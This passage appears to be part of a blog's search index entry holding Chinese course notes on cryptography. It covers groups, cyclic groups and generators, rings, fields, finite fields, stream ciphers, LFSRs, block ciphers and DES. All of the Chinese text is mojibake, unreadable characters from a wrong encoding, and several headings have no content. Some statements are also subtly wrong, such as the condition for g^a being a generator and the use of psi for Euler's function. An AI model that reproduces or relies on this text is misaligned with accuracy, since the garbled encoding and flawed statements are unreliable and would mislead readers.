æ˜¯æœ‰é™çš„ï¼Œç§°ä¸ºæœ‰é™ç¾¤ï¼Œå¦åˆ™ä¸ºæ— é™ç¾¤</li><li>æœ‰é™ç¾¤ä¸­ï¼ŒGçš„å…ƒç´ ä¸ªæ•°ç§°ä¸ºç¾¤Gçš„é˜¶æ•°ï¼Œè¡¨ç¤ºä¸º$|G|$ or $#G$</li><li>è¿˜æ»¡è¶³äº¤æ¢å¾‹ï¼Œåˆ™ç§°ä¸ºç¾¤$<G,*>$ä¸ºAbelç¾¤</li><li><p>å¯†ç å­¦ä¸­ç”¨åˆ°çš„å‡ ä¹éƒ½ä¸ºAbelç¾¤</p></li><li><p>å®ä¾‹ $<Z_8,+>$ï¼Œæ¨¡8åŠ ï¼Œé˜¶ä¸º8</p></li></ul></li></ul><ul><li>å¾ªç¯ç¾¤<ul><li>$g^i = a$ï¼Œaä¸ºä»»æ„çš„ä¸€ä¸ªå…ƒç´ ï¼Œgä¸ºç”Ÿæˆå…ƒæˆ–æœ¬åŸå…ƒ</li><li>å³èƒ½å¤Ÿè‡ªå·±å¯¹è‡ªå·±åšè¿ç®—ï¼Œæœ€ç»ˆèƒ½å¤Ÿéå†ç¾¤</li><li>å®ä¾‹<ul><li>$Z_4$</li><li>$Z_p^*$ï¼Œpä¸ºç´ æ•°ï¼Œè‚¯å®šå­˜åœ¨ç”Ÿæˆå…ƒ<ul><li>å®šç†$Z_n^*$æ¯ä¸€ä¸ªå…ƒç´ éƒ½æœ‰ä¹˜æ³•é€†å…ƒ</li><li>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ç”Ÿæˆå…ƒ</li></ul></li></ul></li><li>æœ¬åŸå…ƒçš„å­˜åœ¨æ€§<ul><li>å¯¹æ¨¡ç´ æ•°p<ul><li><ol><li>å…¶ç”Ÿæˆå…ƒå¿…å®šå­˜åœ¨</li><li>å½“gä¸ºç”Ÿæˆå…ƒä¸”pä¸p-1äº’ç´ æ—¶ï¼Œ$g^a$  mod pä¹Ÿæ˜¯ç”Ÿæˆå…ƒ</li><li>ç”Ÿæˆå…ƒä¸ªæ•°ä¸º$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>å…ƒç´ çš„é˜¶<ul><li>æ‹‰æ ¼æœ—æ—¥å®šç†æ¨è®ºï¼Œæä¾›äº†ç¾¤çš„é˜¶å’Œç¾¤ä¸­å…ƒç´ é˜¶çš„å…³ç³»</li></ul></li></ul><ul><li>ç¯<ul><li>$<R,+>$æ˜¯Abelç¾¤</li><li>$<R,*>$æ˜¯åŠç¾¤</li><li>åˆ†é…å¾‹</li><li>$<R,+,*>$æ˜¯ç¯</li></ul></li></ul><ul><li>åŸŸ<ul><li>$<F,+>$ æ˜¯Abelç¾¤ï¼Œ0æ˜¯+çš„å•ä½å…ƒ</li><li>$<F-0,*>$ æ˜¯Abelç¾¤</li><li>åˆ†é…å¾‹</li><li>$<F,+,*>$æ˜¯åŸŸ</li></ul></li></ul><ul><li>æœ‰é™åŸŸ<ul><li>è‹¥qæ˜¯ç´ æ•°çš„å¹‚ï¼Œå³$q = p^n$ ï¼Œpæ˜¯ç´ æ•°ï¼Œnæ˜¯æ­£æ•´æ•°ï¼Œåˆ™é˜¶ä¸ºqçš„åŸŸè®°ä¸ºGF(q)</li></ul></li></ul><h2 id="9-ç¦»æ•£å¯¹æ•°"><a href="#9-ç¦»æ•£å¯¹æ•°" class="headerlink" title="9.ç¦»æ•£å¯¹æ•°"></a>9.ç¦»æ•£å¯¹æ•°</h2><h2 id="10-å¹³æ–¹å‰©ä½™"><a href="#10-å¹³æ–¹å‰©ä½™" class="headerlink" title="10.å¹³æ–¹å‰©ä½™"></a>10.å¹³æ–¹å‰©ä½™</h2><h2 id="11-å°ç»“"><a href="#11-å°ç»“" class="headerlink" title="11.å°ç»“"></a>11.å°ç»“</h2><h1 id="ä¸‰-åº”ç”¨å¯†ç å­¦"><a href="#ä¸‰-åº”ç”¨å¯†ç å­¦" class="headerlink" title="ä¸‰.åº”ç”¨å¯†ç å­¦"></a>ä¸‰.åº”ç”¨å¯†ç å­¦</h1><h2 id="1-æµå¯†ç "><a href="#1-æµå¯†ç " class="headerlink" title="1.æµå¯†ç "></a>1.æµå¯†ç </h2><p>æµå¯†ç çš„åŸºæœ¬æ€æƒ³ï¼šåˆ©ç”¨å¯†é’¥käº§ç”Ÿä¸€ä¸ªå¯†é’¥æµï¼Œä½¿ç”¨è§„åˆ™å¯¹æ˜æ–‡ä¸²åŠ å¯†</p><p>ä¸ç»´å‰å°¼äºšç±»ä¼¼ï¼Œå¤šè¡¨ä»£æ¢å¯†ç </p><p>å¯†é’¥æµé€šè¿‡å¯†é’¥å‘ç”Ÿå™¨fäº§ç”Ÿ</p><p> $z_i = f(k,\theta_i)$</p><p>åˆ†ç»„å¯†ç å’Œæµå¯†ç çš„åŒºåˆ«åœ¨äºæœ‰æ— è®°å¿†æ€§</p><p>æµå¯†ç çš„æ»šåŠ¨å¯†é’¥ï¼Œç”±å‡½æ•°fï¼Œå¯†é’¥kå’Œåˆå§‹çŠ¶æ€è¥¿æ ¼ç›å®Œå…¨ç¡®å®šã€‚æ­¤åï¼Œè¾“å…¥çš„å¯†æ–‡å¯èƒ½å½±å“åŠ å¯†å™¨ä¸­å†…éƒ¨è®°å¿†å…ƒä»¶çš„å­˜å‚¨çŠ¶æ€ï¼Œå› è€Œå¯èƒ½ä¾èµ–<strong>äºæ‰€æœ‰è¾“å…¥</strong>çš„å½±å“ã€‚</p><p>å¯åˆ†ä¸ºåŒæ­¥å’Œè‡ªåŒæ­¥ä¸¤ç§</p><p>å¯¹ç§°å¯†ç ä½“åˆ¶</p><p>åŒæ­¥æµå¯†ç çš„å˜æ¢$E_i$å¯ä»¥æœ‰å¤šç§é€‰æ‹©ï¼Œåªè¦å˜æ¢å³å¯é€†å³å¯ã€‚</p><p>äºŒå…ƒåŠ æ³•æµå¯†ç æ˜¯æœ€å¸¸ç”¨çš„æµå¯†ç çš„ä½“åˆ¶ã€‚å³å¼‚æˆ–ã€‚</p><p>å¯†é’¥æµåºåˆ—Zåº”è¯¥å…·æœ‰å¦‚ä¸‹æ€§è´¨</p><ul><li>æå¤§çš„å‘¨æœŸ</li><li>è‰¯å¥½çš„ç»Ÿè®¡ç‰¹æ€§</li><li>æŠ—çº¿æ€§åˆ†æ</li><li>æŠ—ç»Ÿè®¡åˆ†æ</li></ul><h3 id="æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº"><a href="#æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº" class="headerlink" title="æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº"></a>æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº</h3><p>æ˜¯å…·æœ‰ç¦»æ•£è¾“å…¥å’Œè¾“å‡ºçš„ä¸€ç§æ•°å­¦æ¨¡å‹ï¼Œç”±ä¸‰éƒ¨åˆ†ç»„æˆ</p><ol><li>æœ‰é™çŠ¶æ€é›†</li><li>æœ‰é™è¾“å…¥å­—ç¬¦é›†ï¼Œæœ‰é™è¾“å‡ºå­—ç¬¦é›†</li><li>è½¬ç§»å‡½æ•°</li></ol><h3 id="å¯†é’¥æµäº§ç”Ÿå™¨"><a href="#å¯†é’¥æµäº§ç”Ÿå™¨" class="headerlink" title="å¯†é’¥æµäº§ç”Ÿå™¨"></a>å¯†é’¥æµäº§ç”Ÿå™¨</h3><p>å…³é”®æ˜¯å¯†é’¥æµäº§ç”Ÿå™¨ã€‚ä¸€èˆ¬å¯å°†å…¶çœ‹æˆä¸ºå‚æ•°ä¸ºkçš„æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼Œæœ‰è¾“å‡ºç¬¦å·é›†ï¼Œä¸€ä¸ªçŠ¶æ€é›†ï¼Œå’Œä¸¤ä¸ªå‡½æ•°ä»¥åŠä¸€ä¸ªåˆå§‹çŠ¶æ€ç»„æˆ</p><p>ä¸¤ä¸ªå‡½æ•°ä¸ºçŠ¶æ€è½¬ç§»å‡½æ•°å’Œå­—ç¬¦è¾“å‡ºå‡½æ•°</p><p>LFSRï¼šçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨</p><p>æœ€å¤§å‘¨æœŸä¸º2çš„næ¬¡æ–¹å‡1ï¼Œnæ˜¯å‡ çº§å¯„å­˜å™¨</p><h2 id="2-åˆ†ç»„å¯†ç ä½“åˆ¶"><a href="#2-åˆ†ç»„å¯†ç ä½“åˆ¶" class="headerlink" title="2.åˆ†ç»„å¯†ç ä½“åˆ¶"></a>2.åˆ†ç»„å¯†ç ä½“åˆ¶</h2><p>å¯¹ç§°å¯†ç ä½“åˆ¶</p><h3 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h3><ul><li><p>åŠ å¯†è§£å¯†</p></li><li><p>æ„æˆå…¶ä»–åŠ å¯†ç®—æ³•çš„ç»„æˆå…ƒç´ </p></li></ul><ul><li>æ˜æ–‡</li><li>æ˜æ–‡åˆ†ç»„</li><li>å¯†é’¥</li><li>å¯†æ–‡åˆ†ç»„</li><li>åŠ å¯†å‡½æ•°</li></ul><p>é€šå¸¸å–å¯†æ–‡åˆ†ç»„æ•°é‡å’Œæ˜æ–‡åˆ†ç»„æ•°é‡ç›¸ç­‰</p><ul><li>è¦æ±‚<ul><li>åˆ†ç»„é•¿åº¦nè¶³å¤Ÿå¤§ï¼Œé˜²æ­¢æ˜æ–‡ç©·ä¸¾æ”»å‡»æ³•</li><li>å¯†é’¥é‡è¶³å¤Ÿå¤§ï¼Œå³ç½®æ¢å­é›†ä¸­çš„å…ƒç´ è¶³å¤Ÿå¤šï¼Œä»¥é˜²æ­¢å¯†é’¥ç©·ä¸¾æ”»å‡»ï¼Œä½†åˆä¸èƒ½è¿‡é•¿ï¼Œç®¡ç†é—®é¢˜</li><li>ç”±å¯†é’¥ç¡®å®šç½®æ¢çš„ç®—æ³•è¦è¶³å¤Ÿå¤æ‚</li><li>åŠ å¯†å’Œè§£å¯†è¿ç®—ç®€å•ï¼Œæ˜“äºè½¯ä»¶å’Œç¡¬ä»¶é«˜é€Ÿå®ç°</li></ul></li></ul><h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2.DES"></a>2.DES</h3><p>å¯†é’¥é•¿åº¦ä¸º56ä½</p><h3 id="3-åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼"><a href="#3-åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼" class="headerlink" title="3.åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼"></a>3.åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼</h3><h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><h3 id="5-AES"><a href="#5-AES" class="headerlink" title="5.AES"></a>5.AES</h3>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¡å†…è¯¾ç¨‹ç¬”è®° </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
